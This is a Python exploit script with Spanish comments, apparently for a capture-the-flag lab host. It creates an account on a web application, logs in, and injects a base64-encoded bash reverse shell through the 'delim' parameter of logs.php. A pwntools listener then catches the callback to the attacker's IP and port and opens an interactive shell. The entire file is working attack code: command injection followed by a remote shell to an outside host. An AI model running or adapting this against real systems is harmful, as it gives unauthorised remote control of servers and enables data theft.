#!/usr/bin/python3

import requests
import base64
import signal
import sys
from pwn import *

# Variables globales -----------------------.
URL = "http://10.10.11.104"
username = "lanza"
password = "lanz321"

# Funciones --------------------------------.
def def_handler(sig, frame):  # Ctrl+C
    print("\nSaliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def create_account():  # Creamos cuenta en el sitio web
    data_post = {
        "username": username,
        "password": password,
        "confirm": password
    }
    r = requests.post(URL + '/accounts.php', data=data_post)

def login():  # Accedemos al sitio web y extraemos sesión
    session = requests.Session()

    data_post = {
        "username": username,
        "password": password
    }
    r = session.post(URL + '/login.php', data=data_post)

    return session

def exe_command(session, lhost, lport):  # Lanzamos petición con Reverse Shell
    reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    reverse_shell_b64 = base64.b64encode(bytes(reverse_shell, 'utf-8')).decode('ascii')

    command = f"echo {reverse_shell_b64} | base64 -d | bash"

    data_post = {
        "delim": "comma;" + command
    }
    try:
        r = session.post(URL + '/logs.php', data=data_post, timeout=5)
    except requests.exceptions.Timeout:
        pass

def print_help():
    print("Uso: %s <attacker_ip> <attacker_port>\n" % (sys.argv[0]))
    print("Script para obtener Reverse Shell explotando 'command-injection'\n")
    print("Ejemplo:\n\t%s 10.10.123.123 4433" % (sys.argv[0]))
    exit(1)

def parse_args():
    if len(sys.argv) != 3:
        print_help()

def main():  # Controlamos lo que hace el programa
    create_account()
    session = login()
    exe_command(session, lhost, lport)

# Inicio del programa ----------------------.
if __name__ == '__main__':
    parse_args()

    lhost = sys.argv[1]
    lport = sys.argv[2]

    try:
        threading.Thread(target=main,).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure(Color.RED + "La conexión no se ha obtenido... Valida IP" + Color.END)
        exit(1)

    # Obtenemos shell interactiva
    shell.interactive()
